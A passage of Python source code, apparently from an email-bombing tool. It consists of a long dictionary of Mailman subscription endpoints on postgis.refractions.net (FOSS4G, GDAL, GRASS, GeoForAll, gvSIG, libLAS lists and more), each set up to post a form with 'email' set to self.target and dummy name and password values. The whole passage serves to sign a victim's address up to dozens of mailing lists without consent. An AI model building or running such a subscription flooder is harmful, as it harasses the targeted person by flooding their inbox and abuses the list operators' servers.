                },
            },
            'dumxq': {
                'url': 'http://postgis.refractions.net/mailman/subscribe/foss4g2017-announce',
                'token_url': 'http://postgis.refractions.net/mailman/listinfo/foss4g2017-announce',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'SexZy': {
                'url': 'http://postgis.refractions.net/mailman/subscribe/foss4g2018',
                'token_url': 'http://postgis.refractions.net/mailman/listinfo/foss4g2018',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'laWaH': {
                'url': 'http://postgis.refractions.net/mailman/subscribe/foss4g2019',
                'token_url': 'http://postgis.refractions.net/mailman/listinfo/foss4g2019',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'kcLmD': {
                'url': 'http://postgis.refractions.net/mailman/subscribe/foss4g2019-workshops',
                'token_url': 'http://postgis.refractions.net/mailman/listinfo/foss4g2019-workshops',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'IfiyX': {
                'url': 'http://postgis.refractions.net/mailman/subscribe/foss4g2020',
                'token_url': 'http://postgis.refractions.net/mailman/listinfo/foss4g2020',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'MLnam': {
                'url': 'http://postgis.refractions.net/mailman/subscribe/francophone',
                'token_url': 'http://postgis.refractions.net/mailman/listinfo/francophone',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'Nvjgr': {
                'url': 'http://postgis.refractions.net/mailman/subscribe/fusion-commits',
                'token_url': 'http://postgis.refractions.net/mailman/listinfo/fusion-commits',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'aPOjy': {
                'url': 'http://postgis.refractions.net/mailman/subscribe/fusion-dev',
                'token_url': 'http://postgis.refractions.net/mailman/listinfo/fusion-dev',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'ASVPw': {
                'url': 'http://postgis.refractions.net/mailman/subscribe/fusion-trac',
                'token_url': 'http://postgis.refractions.net/mailman/listinfo/fusion-trac',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'UESro': {
                'url': 'http://postgis.refractions.net/mailman/subscribe/fusion-users',
                'token_url': 'http://postgis.refractions.net/mailman/listinfo/fusion-users',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'Mtnrr': {
                'url': 'http://postgis.refractions.net/mailman/subscribe/galapagos',
                'token_url': 'http://postgis.refractions.net/mailman/listinfo/galapagos',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'oSmRe': {
                'url': 'http://postgis.refractions.net/mailman/subscribe/gci-discuss',
                'token_url': 'http://postgis.refractions.net/mailman/listinfo/gci-discuss',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'JuICW': {
                'url': 'http://postgis.refractions.net/mailman/subscribe/gdal-announce',
                'token_url': 'http://postgis.refractions.net/mailman/listinfo/gdal-announce',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'DrTKn': {
                'url': 'http://postgis.refractions.net/mailman/subscribe/gdal-commits',
                'token_url': 'http://postgis.refractions.net/mailman/listinfo/gdal-commits',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'BpLgc': {
                'url': 'http://postgis.refractions.net/mailman/subscribe/gdal-dev',
                'token_url': 'http://postgis.refractions.net/mailman/listinfo/gdal-dev',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'rnPXc': {
                'url': 'http://postgis.refractions.net/mailman/subscribe/geodata',
                'token_url': 'http://postgis.refractions.net/mailman/listinfo/geodata',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'JXVbh': {
                'url': 'http://postgis.refractions.net/mailman/subscribe/geoforall',
                'token_url': 'http://postgis.refractions.net/mailman/listinfo/geoforall',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'tdwNh': {
                'url': 'http://postgis.refractions.net/mailman/subscribe/geoforall-africa',
                'token_url': 'http://postgis.refractions.net/mailman/listinfo/geoforall-africa',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'FlsPv': {
                'url': 'http://postgis.refractions.net/mailman/subscribe/geoforall-agrigis',
                'token_url': 'http://postgis.refractions.net/mailman/listinfo/geoforall-agrigis',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'mTJtG': {
                'url': 'http://postgis.refractions.net/mailman/subscribe/geoforall-asiaaustralia',
                'token_url': 'http://postgis.refractions.net/mailman/listinfo/geoforall-asiaaustralia',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'gRRKX': {
                'url': 'http://postgis.refractions.net/mailman/subscribe/geoforall-awards',
                'token_url': 'http://postgis.refractions.net/mailman/listinfo/geoforall-awards',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'ABCNH': {
                'url': 'http://postgis.refractions.net/mailman/subscribe/geoforall-europe',
                'token_url': 'http://postgis.refractions.net/mailman/listinfo/geoforall-europe',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'LnfQy': {
                'url': 'http://postgis.refractions.net/mailman/subscribe/geoforall-geocrowd',
                'token_url': 'http://postgis.refractions.net/mailman/listinfo/geoforall-geocrowd',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'lpXrW': {
                'url': 'http://postgis.refractions.net/mailman/subscribe/geoforall-iberoamerica',
                'token_url': 'http://postgis.refractions.net/mailman/listinfo/geoforall-iberoamerica',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'jZyWc': {
                'url': 'http://postgis.refractions.net/mailman/subscribe/geoforall-labdirectors',
                'token_url': 'http://postgis.refractions.net/mailman/listinfo/geoforall-labdirectors',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'Onhjk': {
                'url': 'http://postgis.refractions.net/mailman/subscribe/geoforall-northamerica',
                'token_url': 'http://postgis.refractions.net/mailman/listinfo/geoforall-northamerica',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'IXLGl': {
                'url': 'http://postgis.refractions.net/mailman/subscribe/geoforall-schools',
                'token_url': 'http://postgis.refractions.net/mailman/listinfo/geoforall-schools',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'fTrXv': {
                'url': 'http://postgis.refractions.net/mailman/subscribe/geoinquietos-bsb',
                'token_url': 'http://postgis.refractions.net/mailman/listinfo/geoinquietos-bsb',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'NhMUV': {
                'url': 'http://postgis.refractions.net/mailman/subscribe/geoinquietos-es',
                'token_url': 'http://postgis.refractions.net/mailman/listinfo/geoinquietos-es',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'muxRa': {
                'url': 'http://postgis.refractions.net/mailman/subscribe/geomoose-users',
                'token_url': 'http://postgis.refractions.net/mailman/listinfo/geomoose-users',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'fWoDa': {
                'url': 'http://postgis.refractions.net/mailman/subscribe/geonode-devel',
                'token_url': 'http://postgis.refractions.net/mailman/listinfo/geonode-devel',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'PNxSi': {
                'url': 'http://postgis.refractions.net/mailman/subscribe/geonode-users',
                'token_url': 'http://postgis.refractions.net/mailman/listinfo/geonode-users',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'mlZeg': {
                'url': 'http://postgis.refractions.net/mailman/subscribe/geoprisma-dev',
                'token_url': 'http://postgis.refractions.net/mailman/listinfo/geoprisma-dev',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'FXjGC': {
                'url': 'http://postgis.refractions.net/mailman/subscribe/geoprisma-users',
                'token_url': 'http://postgis.refractions.net/mailman/listinfo/geoprisma-users',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'DBqWu': {
                'url': 'http://postgis.refractions.net/mailman/subscribe/geos-commits',
                'token_url': 'http://postgis.refractions.net/mailman/listinfo/geos-commits',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'lsZoQ': {
                'url': 'http://postgis.refractions.net/mailman/subscribe/geos-devel',
                'token_url': 'http://postgis.refractions.net/mailman/listinfo/geos-devel',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'duRSe': {
                'url': 'http://postgis.refractions.net/mailman/subscribe/geoserver-jp',
                'token_url': 'http://postgis.refractions.net/mailman/listinfo/geoserver-jp',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'ZgVzU': {
                'url': 'http://postgis.refractions.net/mailman/subscribe/geoserver-security',
                'token_url': 'http://postgis.refractions.net/mailman/listinfo/geoserver-security',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'Hnbqg': {
                'url': 'http://postgis.refractions.net/mailman/subscribe/geotalleres-dev',
                'token_url': 'http://postgis.refractions.net/mailman/listinfo/geotalleres-dev',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'Ocnel': {
                'url': 'http://postgis.refractions.net/mailman/subscribe/geotiff',
                'token_url': 'http://postgis.refractions.net/mailman/listinfo/geotiff',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'JhREO': {
                'url': 'http://postgis.refractions.net/mailman/subscribe/geotoolkit',
                'token_url': 'http://postgis.refractions.net/mailman/listinfo/geotoolkit',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'yrIqp': {
                'url': 'http://postgis.refractions.net/mailman/subscribe/gips',
                'token_url': 'http://postgis.refractions.net/mailman/listinfo/gips',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'qqYix': {
                'url': 'http://postgis.refractions.net/mailman/subscribe/gis.lab',
                'token_url': 'http://postgis.refractions.net/mailman/listinfo/gis.lab',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'fmqKD': {
                'url': 'http://postgis.refractions.net/mailman/subscribe/gisquick',
                'token_url': 'http://postgis.refractions.net/mailman/listinfo/gisquick',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'vKePY': {
                'url': 'http://postgis.refractions.net/mailman/subscribe/graphics',
                'token_url': 'http://postgis.refractions.net/mailman/listinfo/graphics',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'YkDuD': {
                'url': 'http://postgis.refractions.net/mailman/subscribe/grass-abm',
                'token_url': 'http://postgis.refractions.net/mailman/listinfo/grass-abm',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'GPyjj': {
                'url': 'http://postgis.refractions.net/mailman/subscribe/grass-announce',
                'token_url': 'http://postgis.refractions.net/mailman/listinfo/grass-announce',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'fjwIv': {
                'url': 'http://postgis.refractions.net/mailman/subscribe/grass-commit',
                'token_url': 'http://postgis.refractions.net/mailman/listinfo/grass-commit',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'uQIPf': {
                'url': 'http://postgis.refractions.net/mailman/subscribe/grass-dev',
                'token_url': 'http://postgis.refractions.net/mailman/listinfo/grass-dev',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'diwAG': {
                'url': 'http://postgis.refractions.net/mailman/subscribe/grass-es',
                'token_url': 'http://postgis.refractions.net/mailman/listinfo/grass-es',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'UAVjR': {
                'url': 'http://postgis.refractions.net/mailman/subscribe/grass-gui',
                'token_url': 'http://postgis.refractions.net/mailman/listinfo/grass-gui',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'sqWSE': {
                'url': 'http://postgis.refractions.net/mailman/subscribe/grass-psc',
                'token_url': 'http://postgis.refractions.net/mailman/listinfo/grass-psc',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'aprZg': {
                'url': 'http://postgis.refractions.net/mailman/subscribe/grass-qa',
                'token_url': 'http://postgis.refractions.net/mailman/listinfo/grass-qa',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'CkGmM': {
                'url': 'http://postgis.refractions.net/mailman/subscribe/grass-stats',
                'token_url': 'http://postgis.refractions.net/mailman/listinfo/grass-stats',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'sRjTO': {
                'url': 'http://postgis.refractions.net/mailman/subscribe/grass-translations',
                'token_url': 'http://postgis.refractions.net/mailman/listinfo/grass-translations',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'KLTMf': {
                'url': 'http://postgis.refractions.net/mailman/subscribe/grass-user',
                'token_url': 'http://postgis.refractions.net/mailman/listinfo/grass-user',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'RSnso': {
                'url': 'http://postgis.refractions.net/mailman/subscribe/grass-web',
                'token_url': 'http://postgis.refractions.net/mailman/listinfo/grass-web',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'EFTAE': {
                'url': 'http://postgis.refractions.net/mailman/subscribe/greek',
                'token_url': 'http://postgis.refractions.net/mailman/listinfo/greek',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'xvlAg': {
                'url': 'http://postgis.refractions.net/mailman/subscribe/gvsig-argentina',
                'token_url': 'http://postgis.refractions.net/mailman/listinfo/gvsig-argentina',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'ekepP': {
                'url': 'http://postgis.refractions.net/mailman/subscribe/gvsig-batovi',
                'token_url': 'http://postgis.refractions.net/mailman/listinfo/gvsig-batovi',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'jIQxE': {
                'url': 'http://postgis.refractions.net/mailman/subscribe/gvsig-brazil',
                'token_url': 'http://postgis.refractions.net/mailman/listinfo/gvsig-brazil',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'mATqq': {
                'url': 'http://postgis.refractions.net/mailman/subscribe/gvsig-desktop-devel',
                'token_url': 'http://postgis.refractions.net/mailman/listinfo/gvsig-desktop-devel',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'YXWul': {
                'url': 'http://postgis.refractions.net/mailman/subscribe/gvsig-italian',
                'token_url': 'http://postgis.refractions.net/mailman/listinfo/gvsig-italian',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'KGcUl': {
                'url': 'http://postgis.refractions.net/mailman/subscribe/gvsig-russia',
                'token_url': 'http://postgis.refractions.net/mailman/listinfo/gvsig-russia',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'dbPet': {
                'url': 'http://postgis.refractions.net/mailman/subscribe/i3geo',
                'token_url': 'http://postgis.refractions.net/mailman/listinfo/i3geo',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'QEbNJ': {
                'url': 'http://postgis.refractions.net/mailman/subscribe/i3geo-en',
                'token_url': 'http://postgis.refractions.net/mailman/listinfo/i3geo-en',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'rcDQR': {
                'url': 'http://postgis.refractions.net/mailman/subscribe/incubator',
                'token_url': 'http://postgis.refractions.net/mailman/listinfo/incubator',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'DieJC': {
                'url': 'http://postgis.refractions.net/mailman/subscribe/india-board',
                'token_url': 'http://postgis.refractions.net/mailman/listinfo/india-board',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'lMXSQ': {
                'url': 'http://postgis.refractions.net/mailman/subscribe/india-discuss',
                'token_url': 'http://postgis.refractions.net/mailman/listinfo/india-discuss',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'LduVE': {
                'url': 'http://postgis.refractions.net/mailman/subscribe/indonesia',
                'token_url': 'http://postgis.refractions.net/mailman/listinfo/indonesia',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'iient': {
                'url': 'http://postgis.refractions.net/mailman/subscribe/industry',
                'token_url': 'http://postgis.refractions.net/mailman/listinfo/industry',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'Eozgr': {
                'url': 'http://postgis.refractions.net/mailman/subscribe/inspire-data',
                'token_url': 'http://postgis.refractions.net/mailman/listinfo/inspire-data',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'tYCrx': {
                'url': 'http://postgis.refractions.net/mailman/subscribe/ireland',
                'token_url': 'http://postgis.refractions.net/mailman/listinfo/ireland',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'DSTCt': {
                'url': 'http://postgis.refractions.net/mailman/subscribe/itowns-dev',
                'token_url': 'http://postgis.refractions.net/mailman/listinfo/itowns-dev',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'jMDCb': {
                'url': 'http://postgis.refractions.net/mailman/subscribe/itowns-user',
                'token_url': 'http://postgis.refractions.net/mailman/listinfo/itowns-user',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'AIvip': {
                'url': 'http://postgis.refractions.net/mailman/subscribe/jackpine',
                'token_url': 'http://postgis.refractions.net/mailman/listinfo/jackpine',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'KApPb': {
                'url': 'http://postgis.refractions.net/mailman/subscribe/japan_mapguide',
                'token_url': 'http://postgis.refractions.net/mailman/listinfo/japan_mapguide',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'lNVtE': {
                'url': 'http://postgis.refractions.net/mailman/subscribe/java-collab',
                'token_url': 'http://postgis.refractions.net/mailman/listinfo/java-collab',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'QwHEM': {
                'url': 'http://postgis.refractions.net/mailman/subscribe/jobs',
                'token_url': 'http://postgis.refractions.net/mailman/listinfo/jobs',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'UUtkO': {
                'url': 'http://postgis.refractions.net/mailman/subscribe/landsat-pds',
                'token_url': 'http://postgis.refractions.net/mailman/listinfo/landsat-pds',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'dZRYZ': {
                'url': 'http://postgis.refractions.net/mailman/subscribe/las',
                'token_url': 'http://postgis.refractions.net/mailman/listinfo/las',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'EBAEU': {
                'url': 'http://postgis.refractions.net/mailman/subscribe/latvia',
                'token_url': 'http://postgis.refractions.net/mailman/listinfo/latvia',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'nSiHS': {
                'url': 'http://postgis.refractions.net/mailman/subscribe/lesotho',
                'token_url': 'http://postgis.refractions.net/mailman/listinfo/lesotho',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'THzPV': {
                'url': 'http://postgis.refractions.net/mailman/subscribe/lexicon',
                'token_url': 'http://postgis.refractions.net/mailman/listinfo/lexicon',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'ZOdVp': {
                'url': 'http://postgis.refractions.net/mailman/subscribe/liblas-commits',
                'token_url': 'http://postgis.refractions.net/mailman/listinfo/liblas-commits',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'RhbUk': {
                'url': 'http://postgis.refractions.net/mailman/subscribe/liblas-devel',
                'token_url': 'http://postgis.refractions.net/mailman/listinfo/liblas-devel',
                'key': 'received',
